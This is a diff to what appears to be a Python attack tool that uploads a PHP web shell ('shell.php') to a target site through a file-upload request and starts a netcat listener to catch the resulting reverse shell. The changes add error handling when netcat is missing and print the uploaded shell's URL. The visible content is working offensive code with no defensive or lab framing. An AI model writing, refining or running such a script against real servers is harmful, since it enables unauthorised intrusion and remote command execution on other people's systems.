@@ -27,14 +27,18 @@ if (!$fp) {{
     return payload
 
 def start_listener(ip, port):
-    listener = subprocess.Popen(['nc', '-lvnp', f'{port}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    try:
+        listener = subprocess.Popen(['nc', '-lvnp', f'{port}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except FileNotFoundError:
+        print("Netcat (nc) not found. Please install it or use an alternative like socat or telnet.")
+        return None
     return listener
 
 def upload_shell(url, payload, upload_path):
     files = {'file': ('shell.php', payload)}
     response = requests.post(url, files=files)
     if response.status_code == 200:
-        print(f"Shell uploaded successfully to www.example.com (website target)")
+        print(f"Shell uploaded successfully to {url.rstrip('/')}/{upload_path.lstrip('/')}")
         # Construct the shell URL
         base_url = url.rstrip('/')
         shell_url = f"{base_url}/{upload_path.lstrip('/')}"
